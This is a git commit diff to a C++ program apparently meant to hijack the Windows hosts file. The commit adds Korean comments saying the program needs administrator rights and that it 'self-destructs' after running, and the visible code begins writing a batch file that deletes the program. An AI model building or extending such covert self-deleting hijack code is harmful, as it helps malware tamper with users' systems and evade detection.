63383b9af36094395a72855a417903d8715d52b4
KyuBo-Shim <didlaak6000@naver.com>
2020-08-03 16:14:59 +0900

    주석 추가

--- HostHijacking/HostHijacking.cpp
+++ HostHijacking/HostHijacking.cpp
@@ -1,5 +1,6 @@
 ﻿// HostHijacking.cpp : 이 파일에는 'main' 함수가 포함됩니다. 거기서 프로그램 실행이 시작되고 종료됩니다.
-//
+// 관리자 권한에서 실행해야됩니다 ㅠㅅㅠ
+
 #define _CRT_SECURE_NO_WARNINGS
 #include <Windows.h>
 #include <Shlobj.h>
@@ -53,6 +54,7 @@ int main()
 	return 0;
 }
 
+// 실행후 자폭
 void SelfDestruct() {
 	FILE* fp = NULL;
 	const char* killer = "killmyself.bat";
@@ -61,7 +63,7 @@ void SelfDestruct() {
 
 	fp = fopen(killer, "wt");
 	if (fp == NULL) {
-		CLog::WriteError("ERROR: FAILD TO OPEN :(", killer);
+		printf("ERROR: FAILD TO OPEN :(\n");
 		return;
 	}
 	wsprintf(szBatFile,
